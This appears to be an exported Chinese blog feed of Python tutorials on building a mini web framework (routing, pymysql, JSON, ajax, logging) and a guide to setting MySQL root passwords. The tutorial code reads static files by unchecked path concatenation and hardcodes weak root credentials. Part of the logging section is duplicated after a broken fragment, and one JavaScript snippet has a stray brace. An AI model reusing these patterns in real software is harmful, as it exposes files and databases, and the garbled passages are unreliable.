获取个人中心数据@route(&quot;/center.html&quot;)def center():    # 响应状态    status = &quot;200 OK&quot;;    # 响应头    response_header = [(&quot;Server&quot;, &quot;PWS2.0&quot;)]    # 打开模板文件，读取数据    with open(&quot;template/center.html&quot;, &quot;r&quot;) as file:        file_data = file.read()    # 处理后的数据, 从数据库查询    data = time.ctime()    # 替换模板文件中的模板遍历    result = file_data.replace(&quot;{%content%}&quot;, data)    return status, response_header, result# 没有找到动态资源def not_found():    # 响应状态    status = &quot;404 Not Found&quot;;    # 响应头    response_header = [(&quot;Server&quot;, &quot;PWS2.0&quot;)]    # 处理后的数据    data = &quot;not found&quot;    return status, response_header, data# 处理动态资源请求def handle_request(env):    # 获取动态请求资源路径    request_path = env[&quot;request_path&quot;]    print(&quot;接收到的动态资源请求:&quot;, request_path)    # 遍历路由列表，选择执行的函数    for path, func in route_list:        if request_path == path:            result = func()            return result    else:        # 没有找到动态资源        result = not_found()        return result</code></pre><h3 id="2-小结"><a href="#2-小结" class="headerlink" title="2. 小结"></a>2. 小结</h3><ul><li>使用带有参数的装饰器对处理函数进行装饰，并完成路由的添加功能。</li></ul><h2 id="六、显示股票信息页面的开发"><a href="#六、显示股票信息页面的开发" class="headerlink" title="六、显示股票信息页面的开发"></a>六、显示股票信息页面的开发</h2><h3 id="1-数据准备"><a href="#1-数据准备" class="headerlink" title="1. 数据准备"></a>1. 数据准备</h3><pre><code class="sql">-- 创建数据库create database stock_db charset=utf8;-- 切换数据库use stock_db;-- 执行sql文件source stock_db.sql;</code></pre><h3 id="2-根据sql语句查询股票信息"><a href="#2-根据sql语句查询股票信息" class="headerlink" title="2. 根据sql语句查询股票信息"></a>2. 根据sql语句查询股票信息</h3><p><strong>示例代码:</strong></p><pre><code class="python"># 获取首页数据@route(&quot;/index.html&quot;)def index():    # 响应状态    status = &quot;200 OK&quot;;    # 响应头    response_header = [(&quot;Server&quot;, &quot;PWS2.0&quot;)]    # 打开模板文件，读取数据    with open(&quot;template/index.html&quot;, &quot;r&quot;) as file:        file_data = file.read()    # 处理后的数据, 从数据库查询    conn = pymysql.connect(host=&quot;localhost&quot;,                           port=3306,                           user=&quot;root&quot;,                           password=&quot;mysql&quot;,                           database=&quot;stock_db&quot;,                           charset=&quot;utf8&quot;)    # 获取游标    cursor = conn.cursor()    # 查询sql语句    sql = &quot;select * from info;&quot;    # 执行sql    cursor.execute(sql)    # 获取结果集    result = cursor.fetchall()    print(result)</code></pre><h3 id="3-使用查询数据替换模板变量"><a href="#3-使用查询数据替换模板变量" class="headerlink" title="3. 使用查询数据替换模板变量"></a>3. 使用查询数据替换模板变量</h3><p><strong>示例代码:</strong></p><pre><code class="python"># 获取首页数据@route(&quot;/index.html&quot;)def index():    # 响应状态    status = &quot;200 OK&quot;;    # 响应头    response_header = [(&quot;Server&quot;, &quot;PWS2.0&quot;)]    # 打开模板文件，读取数据    with open(&quot;template/index.html&quot;, &quot;r&quot;) as file:        file_data = file.read()    # 处理后的数据, 从数据库查询    conn = pymysql.connect(host=&quot;localhost&quot;,                           port=3306,                           user=&quot;root&quot;,                           password=&quot;mysql&quot;,                           database=&quot;stock_db&quot;,                           charset=&quot;utf8&quot;)    # 获取游标    cursor = conn.cursor()    # 查询sql语句    sql = &quot;select * from info;&quot;    # 执行sql    cursor.execute(sql)    # 获取结果集    result = cursor.fetchall()    print(result)    data = &quot;&quot;    for row in result:        data += &#39;&#39;&#39;&lt;tr&gt;                    &lt;td&gt;%s&lt;/td&gt;                    &lt;td&gt;%s&lt;/td&gt;                    &lt;td&gt;%s&lt;/td&gt;                    &lt;td&gt;%s&lt;/td&gt;                    &lt;td&gt;%s&lt;/td&gt;                    &lt;td&gt;%s&lt;/td&gt;                    &lt;td&gt;%s&lt;/td&gt;                    &lt;td&gt;%s&lt;/td&gt;                    &lt;td&gt;&lt;input type=&quot;button&quot; value=&quot;添加&quot; id=&quot;toAdd&quot; name=&quot;toAdd&quot; systemidvaule=&quot;000007&quot;&gt;&lt;/td&gt;                   &lt;/tr&gt;&#39;&#39;&#39; % row    # 替换模板文件中的模板遍历    result = file_data.replace(&quot;{%content%}&quot;, data)    return status, response_header, result</code></pre><h3 id="4-小结-1"><a href="#4-小结-1" class="headerlink" title="4. 小结"></a>4. 小结</h3><ul><li>根据sql语句查询股票信息</li><li>使用查询数据替换模板变量</li></ul><h2 id="七、个人中心数据接口的开发"><a href="#七、个人中心数据接口的开发" class="headerlink" title="七、个人中心数据接口的开发"></a>七、个人中心数据接口的开发</h2><h3 id="1-根据sql语句查询个人中心数据"><a href="#1-根据sql语句查询个人中心数据" class="headerlink" title="1. 根据sql语句查询个人中心数据"></a>1. 根据sql语句查询个人中心数据</h3><pre><code class="python"># 个人中心数据接口开发@route(&quot;/center_data.html&quot;)def center_data():    # 响应状态    status = &quot;200 OK&quot;;    # 响应头    response_header = [(&quot;Server&quot;, &quot;PWS2.0&quot;), (&quot;Content-Type&quot;, &quot;text/html;charset=utf-8&quot;)]    conn = pymysql.connect(host=&quot;localhost&quot;,                           port=3306,                           user=&quot;root&quot;,                           password=&quot;mysql&quot;,                           database=&quot;stock_db&quot;,                           charset=&quot;utf8&quot;)    # 获取游标    cursor = conn.cursor()    # 查询sql语句    sql = &#39;&#39;&#39;select i.code, i.short, i.chg,              i.turnover, i.price, i.highs, f.note_info              from info as i inner join focus as f on i.id = f.info_id;&#39;&#39;&#39;    # 执行sql    cursor.execute(sql)    # 获取结果集    result = cursor.fetchall()    # 关闭游标    cursor.close()    # 关闭数据库连接    conn.close()    print(result)</code></pre><h3 id="2-将个人中心数据转成json字符串并返回"><a href="#2-将个人中心数据转成json字符串并返回" class="headerlink" title="2. 将个人中心数据转成json字符串并返回"></a>2. 将个人中心数据转成json字符串并返回</h3><pre><code class="python"># 个人中心数据接口开发@route(&quot;/center_data.html&quot;)def center_data():    # 响应状态    status = &quot;200 OK&quot;;    # 响应头    response_header = [(&quot;Server&quot;, &quot;PWS2.0&quot;), (&quot;Content-Type&quot;, &quot;text/html;charset=utf-8&quot;)]    conn = pymysql.connect(host=&quot;localhost&quot;,                           port=3306,                           user=&quot;root&quot;,                           password=&quot;mysql&quot;,                           database=&quot;stock_db&quot;,                           charset=&quot;utf8&quot;)    # 获取游标    cursor = conn.cursor()    # 查询sql语句    sql = &#39;&#39;&#39;select i.code, i.short, i.chg,              i.turnover, i.price, i.highs, f.note_info              from info as i inner join focus as f on i.id = f.info_id;&#39;&#39;&#39;    # 执行sql    cursor.execute(sql)    # 获取结果集    result = cursor.fetchall()    # 关闭游标    cursor.close()    # 关闭数据库连接    conn.close()    # 个人中心数据列表    center_data_list = list()    # 遍历每一行数据转成字典    for row in result:        # 创建空的字典        center_dict = dict()        center_dict[&quot;code&quot;] = row[0]        center_dict[&quot;short&quot;] = row[1]        center_dict[&quot;chg&quot;] = row[2]        center_dict[&quot;turnover&quot;] = row[3]        center_dict[&quot;price&quot;] = str(row[4])        center_dict[&quot;highs&quot;] = str(row[5])        center_dict[&quot;note_info&quot;] = row[6]        # 添加每个字典信息        center_data_list.append(center_dict)    # 把列表字典转成json字符串, 并在控制台显示    json_str = json.dumps(center_data_list,ensure_ascii=False)    print(json_str)    return status, response_header, json_str</code></pre><p><strong>代码说明:</strong></p><ul><li>json.dumps函数把字典转成json字符串<ol><li>函数的第一个参数表示要把指定对象转成json字符串</li><li>参数的第二个参数ensure_ascii=False表示不使用ascii编码，可以在控制台显示中文。</li></ol></li><li>响应头添加Content-Type表示指定数据的编码格式</li></ul><h3 id="3-小结-1"><a href="#3-小结-1" class="headerlink" title="3. 小结"></a>3. 小结</h3><ul><li>web框架程序还可以开发数据接口，为客户端程序提供数据服务。<ul><li><ol><li>根据sql语句查询数据库</li></ol></li><li><ol><li>把数据转成json字符串返回</li></ol></li><li><ol><li>浏览器通过指定接口地址获取web框架提供的数据。</li></ol></li></ul></li></ul><h2 id="八、ajax请求数据渲染个人中心页面"><a href="#八、ajax请求数据渲染个人中心页面" class="headerlink" title="八、ajax请求数据渲染个人中心页面"></a>八、ajax请求数据渲染个人中心页面</h2><h3 id="1-根据用户请求返回个人中心空模板文件数据"><a href="#1-根据用户请求返回个人中心空模板文件数据" class="headerlink" title="1. 根据用户请求返回个人中心空模板文件数据"></a>1. 根据用户请求返回个人中心空模板文件数据</h3><pre><code class="python"># 获取个人中心数据@route(&quot;/center.html&quot;)def center():    # 响应状态    status = &quot;200 OK&quot;    # 响应头    response_header = [(&quot;Server&quot;, &quot;PWS2.0&quot;)]    # 打开模板文件，读取数据    with open(&quot;template/center.html&quot;, &quot;r&quot;) as file:        file_data = file.read()    # 替换模板文件中的模板遍历    result = file_data.replace(&quot;{%content%}&quot;, &quot;&quot;)    return status, response_header, result</code></pre><h3 id="2-在个人中心模板文件添加ajax请求获取个人中心数据"><a href="#2-在个人中心模板文件添加ajax请求获取个人中心数据" class="headerlink" title="2. 在个人中心模板文件添加ajax请求获取个人中心数据"></a>2. 在个人中心模板文件添加ajax请求获取个人中心数据</h3><pre><code class="js">// 发送ajax请求获取个人中心页面数据// 路径写成 center_data.html，发送ajax的时候路径其实是http://ip地址:端口号/center.data.html$.get(&quot;center_data.html&quot;, function (data) {        alert(data);    }}, &quot;json&quot;);</code></pre><h3 id="3-将个人中心数据在页面完成展示"><a href="#3-将个人中心数据在页面完成展示" class="headerlink" title="3. 将个人中心数据在页面完成展示"></a>3. 将个人中心数据在页面完成展示</h3><pre><code class="js">// 发送ajax请求获取个人中心页面数据$.get(&quot;center_data.html&quot;, function (data) {    var data_array = data;    // 获取table标签对象    var $table = $(&quot;.table&quot;)    for(var i = 0; i &lt; data_array.length; i++){        // 获取每一条对象        var center_obj = data_array[i];        var row_html = &#39;&lt;tr&gt;&#39; +            &#39;&lt;td&gt;&#39;+ center_obj.code +&#39;&lt;/td&gt;&#39; +            &#39;&lt;td&gt;&#39;+ center_obj.short +&#39;&lt;/td&gt;&#39; +            &#39;&lt;td&gt;&#39;+ center_obj.chg +&#39;&lt;/td&gt;&#39; +            &#39;&lt;td&gt;&#39;+ center_obj.turnover +&#39;&lt;/td&gt;&#39; +            &#39;&lt;td&gt;&#39;+ center_obj.price +&#39;&lt;/td&gt;&#39; +            &#39;&lt;td&gt;&#39;+ center_obj.highs +&#39;&lt;/td&gt;&#39; +            &#39;&lt;td&gt;&#39;+ center_obj.note_info +&#39;&lt;/td&gt;&#39; +            &#39;&lt;td&gt;&lt;a type=&quot;button&quot; class=&quot;btn btn-default btn-xs&quot; href=&quot;/update/000007.html&quot;&gt; &lt;span class=&quot;glyphicon glyphicon-star&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt; 修改 &lt;/a&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=&quot;button&quot; value=&quot;删除&quot; id=&quot;toDel&quot; name=&quot;toDel&quot; systemidvaule=&quot;000007&quot;&gt;&lt;/td&gt;&lt;/tr&gt;&#39;;        // 为table标签添加每一行组装的html数据        $table.append(row_html);    }}, &quot;json&quot;);</code></pre><h3 id="4-小结-2"><a href="#4-小结-2" class="headerlink" title="4. 小结"></a>4. 小结</h3><ul><li>根据用户请求返回个人中心空模板文件数据</li><li>在个人中心模板文件添加ajax请求获取个人中心数据</li><li>将个人中心数据在页面完成展示</li></ul><h2 id="九、logging日志"><a href="#九、logging日志" class="headerlink" title="九、logging日志"></a>九、logging日志</h2><h3 id="1-logging日志的介绍"><a href="#1-logging日志的介绍" class="headerlink" title="1. logging日志的介绍"></a>1. logging日志的介绍</h3><p>在现实生活中，记录日志非常重要，比如:银行转账时会有转账记录；飞机飞行过程中，会有个黑盒子（飞行数据记录器）记录着飞机的飞行过程，那在咱们python程序中想要记录程序在运行时所产生的日志信息，怎么做呢?</p><p>可以使用 <strong>logging</strong> 这个包来完成</p><p><strong>记录程序日志信息的目的是:</strong></p><ol><li>可以很方便的了解程序的运行情况</li><li>可以分析用户的操作行为、喜好等信息</li><li>方便开发人员检查bug</li></ol><h3 id="2-logging日志级别介绍"><a href="#2-logging日志级别介绍" class="headerlink" title="2. logging日志级别介绍"></a>2. logging日志级别介绍</h3><p>日志等级可以分为5个，从低到高分别是:</p><ol><li>DEBUG</li><li>INFO</li><li>WARNING</li><li>ERROR</li><li>CRITICAL</li></ol><p><strong>日志等级说明:</strong></p><ul><li>DEBUG：程序调试bug时使用</li><li>INFO：程序正常运行时使用</li><li>WARNING：程序未按预期运行时使用，但并不是错误，如:用户登录密码错误</li><li>ERROR：程序出错误时使用，如:IO操作失败</li><li>CRITICAL：特别严重的问题，导致程序不能再继续运行时使用，如:磁盘空间为空，一般很少使用</li><li>默认的是WARNING等级，当在WARNING或WARNING之上等级的才记录日志信息。</li><li>日志等级从低到高的顺序是: DEBUG &lt; INFO &lt; WARNING &lt; ERROR &lt; CRITICAL</li></ul><h3 id="3-logging日志的使用"><a href="#3-logging日志的使用" class="headerlink" title="3. logging日志的使用"></a>3. logging日志的使用</h3><p>在 logging 包中记录日志的方式有两种:</p><ol><li>输出到控制台</li><li>保存到日志文件</li></ol><p><strong>日志信息输出到控制台的示例代码:</strong></p><pre><code class="python">import logginglogging.debug(&#39;这是一个debug级别的日志信息&#39;)logging.info(&#39;这是一个info级别的日志信息&#39;)logging.warning(&#39;这是一个warning级别的日志信息&#39;)logging.error(&#39;这是一个error级别的日志信息&#39;)logging.critical(&#39;这是一个critical级别的日志信息&#39;)</code></pre><p><strong>运行结果:</strong></p><pre><code class="python">WARNING:root:这是一个warning级别的日志信息ERROR:root:这是一个error级别的日志信息CRITICAL:root:这是一个critical级别的日志信息</code></pre><p><strong>说明:</strong></p><ul><li>日志信息只显示了大于等于WARNING级别的日志，这说明默认的日志级别设置为WARNING</li></ul><p><strong>logging日志等级和输出格式的设置:</strong></p><pre><code class="python">import logging# 设置日志等级和输出日志格式logging.basicConfig(level=logging.DEBUG,                    format=&#39;%(asctime)s - %(filename)s[line:%(lineno)d] - %(levelname)s: %(message)s&#39;)logging.debug(&#39;这是一个debug级别的日志信息&#39;)logging.info(&#39;这是一个info级别的日志信息&#39;)logging.warning(&#39;这是一个warning级别的日志信息&#39;)logging.error(&#39;这是一个error级别的日志信息&#39;)logging.critical(&#39;这是一个critical级别的日志信息&#39;)</code></pre><p><strong>运行结果:</strong></p><pre><code class="python">2019-02-13 20:41:33,080 - hello.py[line:6] - DEBUG: 这是一个debug级别的日志信息2019-02-13 20:41:33,080 - hello.py[line:7] - INFO: 这是一个info级别的日志信息2019-02-13 20:41:33,080 - hello.py[line:8] - WARNING: 这是一个warning级别的日志信息2019-02-13 20:41:33,080 - hello.py[line:9] - ERROR: 这是一个error级别的日志信息2019-02-13 20:41:33,080 - hello.py[line:10] - CRITICAL: 这是一个critical级别的日志信息</code></pre><p><strong>代码说明:</strong></p><ul><li>level 表示设置的日志等级</li><li>format 表示日志的输出格式, 参数说明:<ul><li>%(levelname)s: 打印日志级别名称</li><li>%(filename)s: 打印当前执行程序名</li><li>%(lineno)d: 打印日志的当前行号</li><li>%(asctime)s: 打印日志的时间</li><li>%(message)s: 打印日志信息</li></ul></li></ul><p><strong>日志信息保存到日志文件的示例代码:</strong></p><pre><code class="python">import logginglogging.basicConfig(level=logging.DEBUG,                    format=&#39;%(asctime)s - %(filename)s[line:%(lineno)d] - %(levelname)s: %(message)s&#39;,                    filename=&quot;log.txt&quot;,                    filemode=&quot;w&quot;)logging.debug(&#39;这是一个debug级别的日志信息&#39;)logging.info(&#39;这是一个info级别的日志信息&#39;)logging.warning(&#39;这是一个warning级别的日志信息&#39;)logging.error(&#39;这是一个error级别的日志信息&#39;)logging.critical(&#39;这是一个critical级别的日志信息&#39;)</code></pre><h3 id="4-logging日志在mini-web项目中应用"><a href="#4-logging日志在mini-web项目中应用" class="headerlink" title="4. logging日志在mini-web项目中应用"></a>4. logging日志在mini-web项目中应用</h3><p><strong>web.py 程序使用logging日志示例:</strong></p><ol><li><p>程序入口模块设置logging日志的设置</p><pre><code class="python"> import socket import threading import sys import framework import logging # logging日志的配置 logging.basicConfig(level=logging.DEBUG,                     format=&#39;%(asctime)s - %(filename)s[line:%(lineno)d] - %(levelname)s: %(message)s&#39;,                     filename=&quot;log.txt&quot;,                     filemode=&quot;w&quot;)</code></pre></li><li><p>INFO级别的日志输出，示例代码:</p><pre><code class="python"> # 判断是否是动态资源请求 if request_path.endswith(&quot;.html&quot;):     &quot;&quot;&quot;这里是动态资源请求，把请求信息交给框架处理&quot;&quot;&quot;     logging.info(&quot;动态资源请求:&quot; + request_path)     ... else:     &quot;&quot;&quot;这里是静态资源请求&quot;&quot;&quot;     logging.info(&quot;静态资源请求:&quot; + request_path)     ...</code></pre></li><li><p>WARNING级别的日志输出，示例代码:</p><pre><code class="python"> # 获取命令行参数判断长度 if len(sys.argv) != 2:     print(&quot;执行命令如下: python3 xxx.py 9000&quot;)     logging.warning(&quot;用户在命令行启动程序参数个数不正确!&quot;)     return # 判断端口号是否是数字 if not sys.argv[1].isdigit():     print(&quot;执行命令如下: python3 xxx.py 9000&quot;)     logging.warning(&quot;用户在命令行启动程序参数不是数字字符串!&quot;)     return</code></pre></li></ol><p><strong>framework.py 程序使用logging日志示例:</strong></p><ol><li><p>ERROR级别的日志输出，示例代码:</p><pre><code class="python"> # 处理动态资源请求 def handle_request(env):     # 获取动态请求资源路径     request_path = env[&quot;request_path&quot;]     print(&quot;接收到的动态资源请求:&quot;, request_path)     # 遍历路由列表，选择执行的函数     for path, func in route_list:         if request_path == path:             result = func()             return result     else:         logging.error(&quot;没有设置相应的路由:&quot; + request_path)         # 没有找到动态资源         result = not_found()         return result</code></pre></li></ol><p><strong>说明:</strong></p><ul><li>logging日志配置信息在程序入口模块设置一次，整个程序都可以生效。<ul><li>logging.basicConfig 表示 logging 日志配置操作</li></ul></li></ul><h3 id="5-小结-1"><a href="#5-小结-1" class="headerlink" title="5. 小结"></a>5. 小结</h3><ul><li>记录python程序中日志信息使用 logging 包来完成</li><li>logging日志等级有5个:<ol><li>DEBUG</li><li>INFO</li><li>WARNING</li><li>ERROR</li><li>CRITICAL</li></ol></li><li>打印(记录)日志的函数有5个:<ol><li>logging.debug函数, 表示: 打印(记录)DEBUG级别的日志信息</li><li>logging.info函数, 表示: 打印(记录)INFO级别的日志信息</li><li>logging.warning函数, 表示: 打印(记录)WARNING级别的日志信息</li><li>logging.error函数, 表示: 打印(记录)ERROR级别的日志信息<br>ng(“用户在命令行启动程序参数不是数字字符串!”)<br>   return<pre><code></code></pre></li></ol></li></ul><p><strong>framework.py 程序使用logging日志示例:</strong></p><ol><li><p>ERROR级别的日志输出，示例代码:</p><pre><code class="python"> # 处理动态资源请求 def handle_request(env):     # 获取动态请求资源路径     request_path = env[&quot;request_path&quot;]     print(&quot;接收到的动态资源请求:&quot;, request_path)     # 遍历路由列表，选择执行的函数     for path, func in route_list:         if request_path == path:             result = func()             return result     else:         logging.error(&quot;没有设置相应的路由:&quot; + request_path)         # 没有找到动态资源         result = not_found()         return result</code></pre></li></ol><p><strong>说明:</strong></p><ul><li>logging日志配置信息在程序入口模块设置一次，整个程序都可以生效。<ul><li>logging.basicConfig 表示 logging 日志配置操作</li></ul></li></ul><h3 id="5-小结-2"><a href="#5-小结-2" class="headerlink" title="5. 小结"></a>5. 小结</h3><ul><li>记录python程序中日志信息使用 logging 包来完成</li><li>logging日志等级有5个:<ol><li>DEBUG</li><li>INFO</li><li>WARNING</li><li>ERROR</li><li>CRITICAL</li></ol></li><li>打印(记录)日志的函数有5个:<ol><li>logging.debug函数, 表示: 打印(记录)DEBUG级别的日志信息</li><li>logging.info函数, 表示: 打印(记录)INFO级别的日志信息</li><li>logging.warning函数, 表示: 打印(记录)WARNING级别的日志信息</li><li>logging.error函数, 表示: 打印(记录)ERROR级别的日志信息</li><li>logging.critical函数, 表示: 打印(记录)CRITICAL级别的日志信息</li></ol></li></ul>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>linux 安装mysql并设置密码</title>
      <link href="/2020/08/22/2020-08-23-linux-%E5%AE%89%E8%A3%85mysql%E5%B9%B6%E8%AE%BE%E7%BD%AE%E5%AF%86%E7%A0%81/"/>
      <url>/2020/08/22/2020-08-23-linux-%E5%AE%89%E8%A3%85mysql%E5%B9%B6%E8%AE%BE%E7%BD%AE%E5%AF%86%E7%A0%81/</url>
      
        <content type="html"><![CDATA[<h3 id="manjaro安装MySQL并设置密码"><a href="#manjaro安装MySQL并设置密码" class="headerlink" title="manjaro安装MySQL并设置密码:"></a>manjaro安装MySQL并设置密码:</h3><p>安装MySQL：</p><pre><code class="bash">sudo pacman -S mysql</code></pre><p>修改配置文件：</p><pre><code class="bash">sudo vim /etc/mysql/my.cnf  </code></pre><a id="more"></a><p>末行添加：</p><pre><code class="bash">skip-grant-tables</code></pre><p>终端输入：</p><pre><code class="bash">$ mysql</code></pre><pre><code class="bash">修改密码，把passwd替换成想要修改的密码：mysql&gt; ALTER USER &#39;root&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;passwd&#39;;ERROR 1290 (HY000): The MySQL server is running with the --skip-grant-tables option so it cannot execute this statement报错的解决方法：mysql&gt; flush privileges;再次修改密码：mysql&gt; ALTER USER &#39;root&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;passwd&#39;;Query OK, 0 rows affected (0.03 sec)刷新MySQL的系统权限相关表：mysql&gt; flush privileges;Query OK, 0 rows affected (0.02 sec)退出MySQL：mysql&gt; quitBye</code></pre><p>注释最后一行</p><pre><code class="bash">sudo vim /etc/mysql/my.cnf # skip-grant-tables  或者直接删除</code></pre><p>重启mysql                                                                  </p><pre><code class="bash">sudo systemctl restart mysqld.service    </code></pre><p>连接mysql测试一下是否成功：</p><pre><code class="bash">~ &gt;&gt;&gt; mysql -uroot -p                                                                                                                                                     Enter password: Welcome to the MySQL monitor.  Commands end with ; or \g.Your MySQL connection id is 10Server version: 8.0.21 Source distributionCopyright (c) 2000, 2020, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &#39;help;&#39; or &#39;\h&#39; for help. Type &#39;\c&#39; to clear the current input statement.mysql&gt; quitBye</code></pre><p>Welcome to the MySQL monitor.代表已成功登录MySQL；</p><h3 id="ubuntu20-04设置mysql8-0密码"><a href="#ubuntu20-04设置mysql8-0密码" class="headerlink" title="ubuntu20.04设置mysql8.0密码"></a>ubuntu20.04设置mysql8.0密码</h3><p>刚安装完mysql时是默认没有密码的，终端直接输入mysql可以直接进入了</p><p>按照以下步骤输入：</p><pre><code class="sql">1. ALTER USER &#39;root&#39;@&#39;localhost&#39; IDENTIFIED BY &#39;password&#39; PASSWORD EXPIRE NEVER;2. ALTER USER &#39;root&#39;@&#39;localhost&#39; IDENTIFIED WITH mysql_native_password BY &#39;password&#39;;3. FLUSH PRIVILEGES;4. alter user &#39;root&#39;@&#39;localhost&#39; identified by &#39;123456&#39;;重置密码用户名为root的密码</code></pre><h3 id="centos-安装mysql-并设置密码"><a href="#centos-安装mysql-并设置密码" class="headerlink" title="centos 安装mysql 并设置密码"></a>centos 安装mysql 并设置密码</h3><pre><code class="bash">安装mysql：yum install mysql mysql-devel -y查看是否安装成功：yum list mysql-server</code></pre><p>修改密码：</p><pre><code class="sql">$ mysqlmysql&gt; use mysql;mysql&gt; ALTER USER &#39;root&#39;@&#39;localhost&#39; IDENTIFIED WITH mysql_native_password BY &#39;123456&#39;;mysql&gt; FLUSH PRIVILEGES;mysql&gt; quit</code></pre>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>python高级11-mini-Web框架</title>
      <link href="/2020/08/22/2020-08-23-python%E9%AB%98%E7%BA%A711-mini-Web%E6%A1%86%E6%9E%B6/"/>
      <url>/2020/08/22/2020-08-23-python%E9%AB%98%E7%BA%A711-mini-Web%E6%A1%86%E6%9E%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="mini-Web框架"><a href="#mini-Web框架" class="headerlink" title="mini-Web框架"></a>mini-Web框架</h1><h2 id="一、web框架概述"><a href="#一、web框架概述" class="headerlink" title="一、web框架概述"></a>一、web框架概述</h2><h3 id="1-web框架和web服务器的关系介绍"><a href="#1-web框架和web服务器的关系介绍" class="headerlink" title="1. web框架和web服务器的关系介绍"></a>1. web框架和web服务器的关系介绍</h3><a id="more"></a><p><strong>使用web框架专门负责处理用户的动态资源请求，这个web框架其实就是一个为web服务器提供服务的应用程序</strong>，简称web框架。</p><p><img src="E:%5Ccaijinbo_posts%5Cpicture/web%E6%A1%86%E6%9E%B6%E5%92%8Cweb%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%9A%84%E5%85%B3%E7%B3%BB.png" alt="web框架和web服务器的关系"></p><p><strong>关系说明:</strong></p><ul><li>web服务器接收浏览器发起的请求，如果是动态资源请求找web框架来处理</li><li>web框架负责处理浏览器的动态资源请求，把处理的结果发生给web服务器</li><li>web服务器再把响应结果发生给浏览器</li></ul><h3 id="2-静态资源"><a href="#2-静态资源" class="headerlink" title="2. 静态资源"></a>2. 静态资源</h3><p>不需要经常变化的资源，这种资源web服务器可以提前准备好，比如: png/jpg/css/js等文件。</p><h3 id="3-动态资源"><a href="#3-动态资源" class="headerlink" title="3. 动态资源"></a>3. 动态资源</h3><p>和静态资源相反, 这种资源会经常变化，比如: 我们在京东浏览商品时经常会根据条件进行筛选，选择不同条件, 浏览的商品就不同，这种资源web服务器无法提前准备好，需要web框架来帮web服务器进行准备，在这里web服务器可以把.html的资源请求认为是动态资源请求交由web框架进行处理。</p><h3 id="4-WSGI协议"><a href="#4-WSGI协议" class="headerlink" title="4. WSGI协议"></a>4. WSGI协议</h3><p>它是web服务器和web框架之间进行协同工作的一个规则，WSGI协议规定web服务器把动态资源的请求信息传给web框架处理，web框架把处理好的结果返回给web服务器。</p><h3 id="5-小结"><a href="#5-小结" class="headerlink" title="5. 小结"></a>5. 小结</h3><ul><li>web框架是专门为web服务器处理动态资源请求的一个应用程序</li><li>web框架和web服务器的关系是web框架专门服务于web服务器，给web服务器提供处理动态资源请求的服务。</li></ul><h2 id="二、框架程序开发"><a href="#二、框架程序开发" class="headerlink" title="二、框架程序开发"></a>二、框架程序开发</h2><h3 id="1-框架职责介绍"><a href="#1-框架职责介绍" class="headerlink" title="1. 框架职责介绍"></a>1. 框架职责介绍</h3><ul><li>接收web服务器的动态资源请求，给web服务器提供处理动态资源请求的服务。</li></ul><h3 id="2-动态资源判断"><a href="#2-动态资源判断" class="headerlink" title="2. 动态资源判断"></a>2. 动态资源判断</h3><ul><li>根据请求资源路径的后缀名进行判断<ul><li>如果请求资源路径的后缀名是.html则是动态资源请求, 让web框架程序进行处理。</li><li>否则是静态资源请求，让web服务器程序进行处理。</li></ul></li></ul><p><strong>web服务器程序(web.py)代码:</strong></p><pre><code class="python">import socketimport threadingimport sysimport framework# 定义web服务器类class HttpWebServer(object):    def __init__(self, port):        # 创建tcp服务端套接字        tcp_server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        # 设置端口号复用, 程序退出端口立即释放        tcp_server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, True)        # 绑定端口号        tcp_server_socket.bind((&quot;&quot;, port))        # 设置监听        tcp_server_socket.listen(128)        self.tcp_server_socket = tcp_server_socket    # 处理客户的请求    @staticmethod    def handle_client_quest(new_socket):        # 代码执行到此，说明连接建立成功        recv_client_data = new_socket.recv(4096)        if len(recv_client_data) == 0:            print(&quot;关闭浏览器了&quot;)            # 关闭服务与客户端的套接字            new_socket.close()            return        # 对二进制数据进行解码        recv_client_content = recv_client_data.decode(&quot;utf-8&quot;)        print(recv_client_content)        # 根据指定字符串进行分割， 最大分割次数指定2        request_list = recv_client_content.split(&quot; &quot;, maxsplit=2)        # 获取请求资源路径        request_path = request_list[1]        print(request_path)        # 判断请求的是否是根目录，如果条件成立，指定首页数据返回        if request_path == &quot;/&quot;:            request_path = &quot;/index.html&quot;        # 判断是否是动态资源请求        if request_path.endswith(&quot;.html&quot;):            &quot;&quot;&quot;这里是动态资源请求，把请求信息交给框架处理&quot;&quot;&quot;            # 字典存储用户的请求信息            env = {                &quot;request_path&quot;: request_path            }            # 获取处理结果            status, headers, response_body = framework.handle_request(env)            # 使用框架处理的数据拼接响应报文            # 响应行            response_line = &quot;HTTP/1.1 %s\r\n&quot; % status            # 响应头            response_header = &quot;&quot;            # 遍历头部信息            for header in headers:                # 拼接多个响应头                response_header += &quot;%s: %s\r\n&quot; % header            response_data = (response_line +                             response_header +                             &quot;\r\n&quot; +                             response_body).encode(&quot;utf-8&quot;)            # 发送数据            new_socket.send(response_data)            # 关闭socket            new_socket.close()        else:            &quot;&quot;&quot;这里是静态资源请求&quot;&quot;&quot;            try:                # 动态打开指定文件                with open(&quot;static&quot; + request_path, &quot;rb&quot;) as file:                    # 读取文件数据                    file_data = file.read()            except Exception as e:                # 请求资源不存在，返回404数据                # 响应行                response_line = &quot;HTTP/1.1 404 Not Found\r\n&quot;                # 响应头                response_header = &quot;Server: PWS1.0\r\n&quot;                with open(&quot;static/error.html&quot;, &quot;rb&quot;) as file:                    file_data = file.read()                # 响应体                response_body = file_data                # 拼接响应报文                response_data = (response_line + response_header + &quot;\r\n&quot;).encode(&quot;utf-8&quot;) + response_body                # 发送数据                new_socket.send(response_data)            else:                # 响应行                response_line = &quot;HTTP/1.1 200 OK\r\n&quot;                # 响应头                response_header = &quot;Server: PWS1.0\r\n&quot;                # 响应体                response_body = file_data                # 拼接响应报文                response_data = (response_line + response_header 